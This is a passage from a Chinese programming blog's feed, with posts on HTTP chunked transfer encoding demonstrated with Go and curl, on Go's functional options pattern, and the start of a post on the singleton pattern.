        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 HTTP 的消息头（即请求头和响应头）中，有一个叫 <code>Content-Length</code> 的字段，用于表示消息体的大小。早期版本的 HTTP 通过服务端发起的断开连接来表示一个消息的结束，这种方式在多数情况下都工作的很好，但是它存在两个比较严重的问题。第一是，在没有一个表示完整消息大小的字段来帮助检查的情况下，客户端无法得知连接的断开是正常情况还是由于消息的传输发生了异常；第二是，在多个 HTTP 消息共用同一个 TCP 连接的场景下，客户端无法找到不同消息间的边界。</p><p>所以，HTTP 的规范要求 <code>Content-Length</code> 字段是必须被提供的（虽然实际测试时发现如果服务端没有提供，很多工具依然会将关闭连接作为默认的消息边界）。</p><p>但是，有种消息，它是没有这个字段的，取而代之地使用另一种方式来确保消息的完整性，它就是这篇文章的主角，Chunked Encoding，一种消息的传输编码（Transfer Encoding）。</p><h1 id="Chunked-Encoding-与-curl"><a href="#Chunked-Encoding-与-curl" class="headerlink" title="Chunked Encoding 与 curl"></a>Chunked Encoding 与 curl</h1><p>我最早了解到 Chunked Encoding 恰恰是在用 curl 来测试服务端不提供 <code>Content-Length</code> 会发生什么时。一般来讲，如果你使用 HTTP 的框架提供服务，那么这个消息头是会被框架来处理的。所以最简单的一种绕过框架、发送一个没有这个字段的响应的方式，就是直接使用 TCP，比如在 golang 中你可以编写这样的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TCPServer</span><span class="params">()</span></span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">"localhost:8080"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line">conn.Write([]<span class="keyword">byte</span>(<span class="string">"HTTP/1.1 200 OK\r\n"</span> +</span><br><span class="line"><span class="string">"Date: Wed, 04 May 2022 12:38:41 GMT\r\n"</span> +</span><br><span class="line"><span class="string">"Content-Type: text/plain; charset=utf-8\r\n"</span> +</span><br><span class="line"><span class="string">"\r\n1234567890"</span>))</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码不是很标准，因为这个程序没有读取请求而直接发送响应，不过这无伤大雅。代码主要做的事情就是发送一个没有 <code>Content-Length</code> 请求头字段的响应，但是在请求体里有 <code>1234567890</code> 这样的内容。这时如果执行它，并且使用 <code>curl -v localhost:8080</code>，那么在 curl 的输出中可以发现 <code>no chunk, no close, no size. Assume close to signal end</code> 这样的输出，这证明了我在前言中的描述。</p><p>那么，Chunked Encoding 的响应体是什么样的呢，为什么它会被 curl 区别对待？我们仍然可以用 golang 和 curl 进行测试。</p><p>golang 的 http 包本身就支持 Chunked Encoding，它的 http.ResponseWriter 接口可以被显式转换成 Flusher 接口，这个接口提供一个 Flush 方法，如果调用它，那么它会以 Chunked Encoding 方式处理发送的内容，于是我们可以编写这样的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPServer</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(rw http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">flusher, ok := rw.(http.Flusher)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"can not convert rw to flusher"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">rw.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">"message #%d\n"</span>, i)))</span><br><span class="line">flusher.Flush()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := http.ListenAndServe(<span class="string">"localhost:8080"</span>, <span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码试图分五次发送响应体，每次间隔一秒钟。如果我们使用 <code>curl -v localhost:8080</code> ，那么会发现响应体确实如预期一般每隔一秒发送一部分，同时响应头中有 <code>Transfer-Encoding: chunked</code> 这样的字段表示这个响应是以 Chunked Encoding 的方式被发送的，而且这个响应也确实没有 <code>Content-Length</code> 这个字段。</p><p>更进一步的，如果再为 curl 加上 –raw 参数，也就是使用 <code>curl -v --raw localhost:8080</code>，那么就可以获取原始的响应体内容，这个命令的结果是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">b</span><br><span class="line">message #0</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #1</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #2</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #3</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #4</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>再进一步，如果命令变成了 <code>curl -v --raw localhost:8080 | hexdump -C</code> ，就可以得到这样的响应体内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000  62 0d 0a 6d 65 73 73 61  67 65 20 23 30 0a 0d 0a  |b..message #0...|</span><br><span class="line">00000010  62 0d 0a 6d 65 73 73 61  67 65 20 23 31 0a 0d 0a  |b..message #1...|</span><br><span class="line">00000020  62 0d 0a 6d 65 73 73 61  67 65 20 23 32 0a 0d 0a  |b..message #2...|</span><br><span class="line">00000030  62 0d 0a 6d 65 73 73 61  67 65 20 23 33 0a 0d 0a  |b..message #3...|</span><br><span class="line">00000040  62 0d 0a 6d 65 73 73 61  67 65 20 23 34 0a 0d 0a  |b..message #4...|</span><br><span class="line">00000050  30 0d 0a 0d 0a                                    |0....|</span><br><span class="line">00000055</span><br></pre></td></tr></table></figure><p>这样看来就很明显了：Chunked Encoding 发送的每一部分响应体，都会以一个 16 进制的数字作为开始，这个数字表示这部分响应体的长度，后面接 <code>\r\n</code> ，然后是具体的响应体内容，再接 <code>\r\n</code>标记这部分响应的结束（上面例子中倒数第三列的 0a 是前面 <code>fmt.Sprintf(&quot;message #%d\n&quot;, i)</code> 中的 \n，并不是 Chunked Encoding 的结构）。最终，以 0 表示整个响应的结束，由于长度为 0，那么紧随其后的只有两个 <code>\r\n</code>。</p><h1 id="Chunked-Encoding-与-Golang-http-的客户端"><a href="#Chunked-Encoding-与-Golang-http-的客户端" class="headerlink" title="Chunked Encoding 与 Golang http 的客户端"></a>Chunked Encoding 与 Golang http 的客户端</h1><p>golang 对 Chunked Encoding 的支持不仅限于服务端，比如我们还是使用上面的代码作为服务端，但是编写这样的代码来作为客户端：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPClient</span><span class="params">()</span></span> &#123;</span><br><span class="line">rsp, err := http.Get(<span class="string">"http://localhost:8080"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">512</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="built_in">len</span>, err := rsp.Body.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">fmt.Println(<span class="string">"Done"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="built_in">len</span>, <span class="keyword">string</span>(buf[:<span class="built_in">len</span>]))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么在运行它后，会得到如下的输出（每部分同样会间隔一秒）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">11 message #0</span><br><span class="line"></span><br><span class="line">11 message #1</span><br><span class="line"></span><br><span class="line">11 message #2</span><br><span class="line"></span><br><span class="line">11 message #3</span><br><span class="line"></span><br><span class="line">11 message #4</span><br><span class="line"></span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p>通过前面的内容我们可以知道，响应体的内容是包含长度、<code>\r\n</code>、部分响应体内容的，但是如果我们直接使用 golang 的 http.Response.Body.Read 方法，就可以直接拿到响应体的有效内容部分，不需要我们自己去做一些额外的操作（比如读取长度，跳过CRLF，验证长度等等）。</p><h1 id="Chunked-Encoding-与-Golang-http-的服务端"><a href="#Chunked-Encoding-与-Golang-http-的服务端" class="headerlink" title="Chunked Encoding 与 Golang http 的服务端"></a>Chunked Encoding 与 Golang http 的服务端</h1><p>现在让我们把关注点放回到服务端上，不难想象，这种不需要提前计算 <code>Content-Length</code>、动态持续生成内容的消息类型，在一定程度上是可以实现 Websocket 的功能的，因为常规 HTTP 的痛点就在于它是一问一答的形式，而且回答的内容在被发送前就要确定下来。事实上，如果读者熟悉 Kubernetes 的 watch 机制，就会知道它是同时支持 Chunked Encoding 和 Websocket 两种方式的。</p><p>所以我们可以编写下面这样的一个小例子来演示 Chunked Encoding 的这种能力：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用来线程安全地对 connections 变量使用 append</span></span><br><span class="line"><span class="keyword">var</span> globalLock = &amp;sync.Mutex&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用来保存所有的 Connection 对象</span></span><br><span class="line"><span class="keyword">var</span> connections []*Connection</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个 Connection 对象，并将它放入 connections 切片中</span></span><br><span class="line">http.HandleFunc(<span class="string">"/watch"</span>, <span class="function"><span class="keyword">func</span><span class="params">(rw http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">c := NewConnection(rw)</span><br><span class="line"></span><br><span class="line">globalLock.Lock()</span><br><span class="line">fmt.Println(<span class="string">"Append one"</span>)</span><br><span class="line">connections = <span class="built_in">append</span>(connections, c)</span><br><span class="line">globalLock.Unlock()</span><br><span class="line"></span><br><span class="line">c.Send(<span class="string">"Start Watching...\n"</span>)</span><br><span class="line"><span class="keyword">select</span> &#123;&#125; <span class="comment">// 避免函数退出，从而保留住连接，这会有协程泄露的问题，但是这里先不管</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 connections 中的所有连接发送一条消息</span></span><br><span class="line">http.HandleFunc(<span class="string">"/send"</span>, <span class="function"><span class="keyword">func</span><span class="params">(rw http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">msg := r.URL.Query().Get(<span class="string">"msg"</span>)</span><br><span class="line"><span class="keyword">for</span> _, c := <span class="keyword">range</span> connections &#123;</span><br><span class="line">fmt.Println(<span class="string">"Send one"</span>)</span><br><span class="line">c.Send(msg + <span class="string">"\n"</span>) <span class="comment">// 这里加一个回车方便观察</span></span><br><span class="line">&#125;</span><br><span class="line">rw.Write([]<span class="keyword">byte</span>(<span class="string">"Done"</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := http.ListenAndServe(<span class="string">"localhost:8080"</span>, <span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代表一个 Chunked Encoding 连接，提供 Send 方法用于发送一部分响应体</span></span><br><span class="line"><span class="keyword">type</span> Connection <span class="keyword">struct</span> &#123;</span><br><span class="line">rw      http.ResponseWriter</span><br><span class="line">flusher http.Flusher</span><br><span class="line">lock    *sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewConnection</span><span class="params">(rw http.ResponseWriter)</span> *<span class="title">Connection</span></span> &#123;</span><br><span class="line">flusher, ok := rw.(http.Flusher)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"can not convert rw to flusher"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;Connection&#123;rw, flusher, &amp;sync.Mutex&#123;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 Chunked Encoding 的方式发送响应体的一部分</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Connection)</span> <span class="title">Send</span><span class="params">(msg <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里的加锁是必须的，因为下面的操作并不是原子的</span></span><br><span class="line"><span class="comment">// 而多协程同时写响应体会导致 Chunked Encoding 的结构乱掉，从而引发客户端异常</span></span><br><span class="line">c.lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> c.lock.Unlock()</span><br><span class="line"></span><br><span class="line">c.rw.Write([]<span class="keyword">byte</span>(msg))</span><br><span class="line">c.flusher.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码有些长，主要的功能是提供了 /watch 和 /send 两个 path，前者用于和服务端保持一个连接，并从这个连接中接受被服务端下发的内容，后者则可以传递一个 msg 的 query 参数，其内容会被广播给所有的 Chunked Encoding 连接。</p><p>运行这个程序，然后多准备几个终端窗口，均执行 <code>curl -v localhost:8080/watch</code>，待它们都显示 <code>Start Watching...</code> 消息后，再打开一个终端窗口，执行  <code>curl localhost:8080/send\?msg=aaaaa</code>，就可以发现前面的所有窗口都收到了 <code>aaaaa</code> 这个消息。而这，其实本质上和 k8s 的 watch 机制是一样的。</p><p>上面的代码仅仅起到抛砖引玉的作用，由于 Chunked Encoding 在一定程度上提供了类似全双工通信的能力，我们完全可以基于它实现更多，比如实时消息推送、聊天室等等。</p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>最近辞掉了公司实习生的身份，距离毕业后回去做正式员工还有大概一个多月的时间，想在这段时间内好好休息一下。由于手头的工作就只有毕业设计和毕业论文，便有了更充足的时间来兴趣驱动地学一些东西。近期在读《HTTP-The-Definitive-Guide》这本书，主要目的是更深入地了解一些 HTTP 的特性，其次也想借此锻炼一下自己的英语阅读能力。</p><p>不过我是乱序读的，目前暂定的阅读顺序是 <code>HTTPS -&gt; Entity&amp;Encoding -&gt; Connection Management -&gt; Cookie -&gt; Cache</code>，其他的内容就按需添加。</p><p>这篇文章就是我在阅读了 <code>Entity &amp; Encoding</code> 部分后，针对 http chunked encoding 这个特性的一个总结与实践。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Functional-Options</title>
      <link href="/2021/04/30/Functional-Options/"/>
      <url>/2021/04/30/Functional-Options/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>到了大三，学校的课设开始不限制实现的语言了，考虑到为未来打基础，于是我大部分的课设都使用 Golang 来完成，以期在实践中逐渐熟练这门简洁却高效的语言。</p><p>在使用的过程中，经常会遇见对结构体进行初始化的需求，如果只是简单的字段还好，直接通过字面量来初始化即可，然而对于一些拥有复杂结构及依赖的结构体，其初始化不论是用户友好性还是可读性上都不适合使用字面量来初始化，在 Golang 的标准库中通常采用返回结构体指针的 New 函数来实现（如 list.New，sync.NewCond），这样在函数中屏蔽了相关的实现细节，以让用户能够聚焦在简单的使用上。</p><p>然而，Golang 目前并不支持函数的重载，这导致 New 函数的特征标（signature）是写死的，函数需要什么参数，用户就只能传递什么参数来初始化相应的字段。如果想达到前文所述的易用，那么参数就不该设置得太多；但是如果想给用户足够的能力来按需设置结构体，那么参数就不该设置得太少，这使得开发者很难找到一个平衡点，来设计方便高效的参数进行初始化。</p><p>有没有什么方法，能使用同一个初始化函数，通过提供不同的参数来完成对结构体不同程度的初始化呢？</p><h1 id="0x01-解决方法及原理"><a href="#0x01-解决方法及原理" class="headerlink" title="0x01 解决方法及原理"></a>0x01 解决方法及原理</h1><p>最近在逛<a href="https://coolshell.cn/articles/21146.html" target="_blank" rel="noopener">左耳耗子老师的博客</a>的时候偶然看到了如题所述的 Functional Options 模式，该模式非常优雅地利用闭包和可变参数等性质来解决了前文所述的问题，下面给出一个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name  <span class="keyword">string</span></span><br><span class="line">age   <span class="keyword">int</span></span><br><span class="line">hobby <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> withFunc <span class="function"><span class="keyword">func</span><span class="params">(*Person)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">withName</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.name = name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">withAge</span><span class="params">(age <span class="keyword">int</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.age = age</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">withHobby</span><span class="params">(hobby <span class="keyword">string</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.hobby = hobby</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makePerson</span><span class="params">(funcs ...withFunc)</span> *<span class="title">Person</span></span> &#123;</span><br><span class="line">ret := &amp;Person&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> funcs &#123;</span><br><span class="line">f(ret)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p1 := makePerson(withName(<span class="string">"Yuren"</span>))</span><br><span class="line">p2 := makePerson(withName(<span class="string">"Yuren"</span>), withAge(<span class="number">21</span>))</span><br><span class="line">p3 := makePerson(withName(<span class="string">"Yuren"</span>), withAge(<span class="number">21</span>), withHobby(<span class="string">"Program"</span>))</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"%+v\n%+v\n%+v\n"</span>, p1, p2, p3)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于所谓的 New 函数，我个人比较习惯于将其命名为 make+结构体名 的形式，这里就请忽略这个非常不 Golang 的函数名，转而聚焦到函数的实现上。</p><p>可以看到，makePerson 函数本身接收一个 withFuncs 的可变参数列表，withFuncs 作为一种类型定义，其本质上是一个需要传递 Person 指针的函数。按照这种特征标，代码中的 withName，withAge 和 withHobby 的返回值都是符合 withFuncs 类型的实现，由于这三者原理上相同，这里只用 withName 来举例。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">withName</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.name = name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>withName 的函数定义如上，可以看到其返回了一个 withFunc 类型的函数。该函数利用闭包将传递给外层 withName 的 name 参数绑定在其作用域内，使得 withFunc 函数返回后依然具备访问 name 变量的能力，而该函数本身做的事情就是将传递进来的 Person 指针指向的实例中的 name 字段设置为 name 变量的值。</p><p>具体的 Person 指针的传递发生在 makePerson 函数调用的时候，即 p1~p3 处，在调用时传递了需要的 with* 函数的调用，将其返回的 withFunc 类型的函数放到了 makePerson 的参数列表中。</p><p>makePerson 做的事情就是用待返回的 Person 指针来消耗可变参数列表中的 withFunc 函数，以使其内部的字段被函数初始化成闭包内保留的值。</p><h1 id="0x2-总结"><a href="#0x2-总结" class="headerlink" title="0x2 总结"></a>0x2 总结</h1><p>本文试图通过抛出笔者平时遇到的结构体初始化的矛盾，进而通过学习给出相应的解决办法，同时阐述相关的原理。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之单例模式</title>
      <link href="/2020/11/13/DesignPattern-Singleton/"/>
      <url>/2020/11/13/DesignPattern-Singleton/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>单例模式是一个比较简单的模式，其目的在于<strong>确保某一个类只有一个实例，并且自行实例化并向整个系统提供这个实例</strong>。一般来说，对于一些创建、销毁比较昂贵的对象实例，也许使用单例模式是一个不错的选择。比如一个始终需要从键盘获取用户输入的系统，我们可以在类似 Utils 的静态类中设置一个全局唯一的Scanner类，始终用于获取用户的输入，从而避免每次创建删除同类对象产生的开销。</p><h1 id="0x1-基本代码"><a href="#0x1-基本代码" class="headerlink" title="0x1 基本代码"></a>0x1 基本代码</h1><p>很多设计模式相关的教程上都将单例模式分为饿汉单例和懒汉单例，它们的基本代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 饿汉单例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">private</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 懒汉单例（线程不安全）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 